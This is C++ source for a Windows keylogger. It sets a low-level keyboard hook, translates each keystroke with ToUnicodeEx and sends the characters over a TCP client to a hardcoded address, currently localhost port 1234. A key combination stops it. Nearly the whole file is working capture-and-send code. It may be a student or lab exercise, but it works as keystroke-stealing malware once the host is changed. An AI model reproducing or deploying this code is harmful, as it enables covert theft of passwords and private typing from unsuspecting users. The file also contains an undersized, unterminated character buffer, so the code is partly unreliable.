/**
        KEYLOGGER
    @author EP
**/
#include <iostream>
#include <winsock2.h>
#include <Windows.h>
#include <fcntl.h>
#include <io.h>
#include<string>
#include<thread>
#include<fstream>
#include<mutex>
#include<condition_variable>
#include<iostream>
#include<winsock2.h>
#include<string>
#include "tcpClient.h"




using namespace std;

// variables used for various purposes all throughout the code
HHOOK keyboardHook;
BYTE keyState[256] = { 0 };
tcpClient* newClient = new tcpClient("127.0.0.1",(USHORT)1234);


int cpsLock = -1;




bool dataReady = false;
bool quitSig = false;

void cleanUp()
{
    wcout<<"[KEYLOGGER] Exiting..."<<endl;
    newClient->closeConnection();
    UnhookWindowsHookEx(keyboardHook);
    exit(0);
}
// callback function for LL keyboard hook
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{

    // if key is released, the switches are necessary to maintain the state of the keyboard
    // since function GetKeyboardState does not work when using LL hook
    if(nCode >= 0 && (wParam==WM_KEYUP || wParam==WM_SYSKEYUP))
    {
        KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
        //
        switch(pKeyStruct->vkCode)
        {
        case VK_LSHIFT:
        case VK_RSHIFT:
            keyState[VK_SHIFT] = 0;
            break;
        case VK_RMENU:
            wcout<<"[RALT UP]"<<endl;
            keyState[VK_RMENU] = 0;
            break;
        case VK_BACK:
            keyState[VK_BACK] = 0;
            wcout<<"[BACKSPACE UP]"<<endl;
            break;
        case VK_PRIOR:
            keyState[VK_PRIOR] = 0;
            wcout<<"[P]"<<endl;
            break;
        default:
            break;
        }
    }

    // if key is pressed
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {

       

        KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
        

        switch(pKeyStruct->vkCode)
        {
        case VK_LSHIFT:
        case VK_RSHIFT:
            keyState[VK_SHIFT] = 0x80;
            break;
        case VK_RMENU:
            wcout<<"[RALT DOWN]"<<endl;
            keyState[VK_RMENU] = 0x80;
            if ((keyState[VK_TAB] & 0x80) && (keyState[VK_BACK] & 0x80) && (keyState[VK_RMENU] & 0x80)){cleanUp();}
            break;
        case VK_CAPITAL:
            wcout<<"[CAPS]"<<endl;
            cpsLock =cpsLock*-1;
            keyState[VK_CAPITAL] = cpsLock * 0x80;
            break;
        case VK_BACK:
            keyState[VK_BACK] = 0x80;
            wcout<<"[BACKSPACE]"<<endl;
            if ((keyState[VK_TAB] & 0x80) && (keyState[VK_BACK] & 0x80) && (keyState[VK_RMENU] & 0x80)){ cleanUp();}
            break;
        case VK_PRIOR:         
            keyState[VK_PRIOR] = 0x80;
            if ((keyState[VK_PRIOR] & 0x80) && (keyState[VK_BACK] & 0x80) && (keyState[VK_RMENU] & 0x80)){cleanUp();} 
            break;
        case VK_RETURN:
            newClient->transmitData("\n");
            break;
        default:
            HKL keyboardLayout = GetKeyboardLayout(0);
            WCHAR uniChar[1];

            int unicodeState = ToUnicodeEx(pKeyStruct->vkCode,0,keyState,uniChar,10,0,keyboardLayout);

            if(unicodeState <= 0){
                break;
            }

            wstring wstrUniChar = std::wstring(uniChar);
            string strUniChar = std::string(wstrUniChar.begin(), wstrUniChar.end());
            newClient->transmitData(strUniChar);

            

            break;
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}



int main()
{

    
    
    //modification for printing UTF-16 chars to console
    _setmode(_fileno(stdout), _O_U16TEXT);
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    MSG msg;

    //main message loop, does not occupy 100% CPU :D
    while(GetMessage(&msg, NULL, 0, 0))
    {   
        wcout<<"Keylogger"<<endl;
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    
    return 0;
}
